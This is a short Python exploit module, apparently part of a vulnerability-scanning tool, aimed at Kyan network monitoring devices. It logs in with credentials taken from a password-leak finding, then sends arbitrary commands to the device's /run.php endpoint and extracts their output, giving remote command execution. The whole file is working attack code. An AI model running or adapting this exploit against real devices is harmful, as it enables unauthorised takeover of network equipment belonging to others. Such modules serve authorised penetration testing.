# -*- coding:utf-8 -*-
# Kyan 网络监控设备 密码泄露
import re

import requests

from VulnScanModel.models import VulnScan
from . import kyan_pwd_poc
from .. import requestUtil
from ..requestClass import Requests

session = requests.session()

class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def rce(self, url, cmd):
        resp = self.requestUtil.post(url + "/run.php", data=f"command={cmd}", session=session)
        return re.findall("readonly>(.*?)</textarea", resp.text, re.DOTALL)[0].strip()

    def login(self, url, username, password):
        print(username, password)
        resp = self.requestUtil.post(url=url + "/login.php", data=f"user={username}&passwd={password}", session=session)
        print(resp.text)
        return True

    def exp(self, cmd, content=""):
        [username, password] = (self.vuln.specify.split("[pw]"))
        self.login(self.vuln.url, username, password)
        return self.rce(self.vuln.url, cmd)
